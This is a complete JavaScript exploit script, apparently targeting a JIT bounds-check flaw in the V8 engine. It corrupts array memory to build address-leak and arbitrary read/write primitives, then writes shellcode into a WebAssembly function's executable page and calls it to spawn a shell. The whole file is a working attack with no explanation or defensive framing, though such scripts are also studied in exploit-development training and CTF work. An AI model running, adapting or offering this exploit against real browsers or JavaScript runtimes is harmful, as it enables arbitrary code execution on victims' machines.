let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
print = console.log
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}
Number.prototype.hex = function() {
    return '0x' + this.toString(16);
}
SUCCESS = 0;
let evil = new Array(0x7ffffff);

function opt_me() {
	let idx = evil.length;
	let val = (idx + 1); 
	val = val >> 27;
	val = val * 0x7;
	if (val >= 0x7)
		leak = 0;
	else {
		bait = new Array(1.1, 1.1);
		oobArray = new Array(2.2,2.2);
		unpackedArray = new Array(1.1, 1.1);
		packedArray = new Array({},{});
		leak = bait[val];
		bait[val] = 8.691694759794e-311;
		if (leak != 1.1 && leak != 0 && leak != undefined) {
			return SUCCESS;
		}
	}
}

for (var i = 0; i < 0x100000; ++i) {
	res = opt_me();
	if( res == SUCCESS)
		break;
}
oobArray.length = 0x1000;
const RW = 0xC;
const ADDR_OF = 0x1e;
oobArray.getAddr = function (object){
    packedArray[0] = object;
    return oobArray[ADDR_OF].f2i();
}
oobArray.getQwordPtr = function (addr){
    var old = oobArray[RW];
    oobArray[RW] = (addr-15n).i2f();
    var r = unpackedArray[0].f2i();
    oobArray[RW] = old;
    return r;
}
oobArray.setQwordPtr = function (addr,val){
    var old = oobArray[RW];
    oobArray[RW] = (addr-15n).i2f();
    unpackedArray[0] = val.i2f();
    oobArray[RW] = old;
}
var test = [1.1,2.2,3.3,4.4];
test_addr = oobArray.getAddr(test) - 1n;
test_backing_store = oobArray.getQwordPtr(test_addr+0x10n)-1n;
print(test_backing_store.hex())
oobArray.setQwordPtr(test_backing_store+0x10n, (1337));
if( oobArray.getQwordPtr(test_backing_store+0x10n) != 1337 && test[0].f2i() != 1337)
    throw "[-] fail r/w"
print("[+] success /rw");
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
let shellcode = [
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x9090909090909090n,
    0x91969dd1bb48c031n,
    0x53dbf748ff978cd0n,
    0xb05e545752995f54n,
    0xcccccccccc050f3bn
];
let f_addr = oobArray.getAddr(f);
print(f_addr.hex())
let rwx_addr = oobArray.getQwordPtr(f_addr-1n - 0x130n + 0x8n) + 0x240n;
print(rwx_addr.hex());
for(var i = 0; i < shellcode.length; i++)
	oobArray.setQwordPtr(rwx_addr + BigInt(i)*8n, shellcode[i]);
print("get shell")
f();
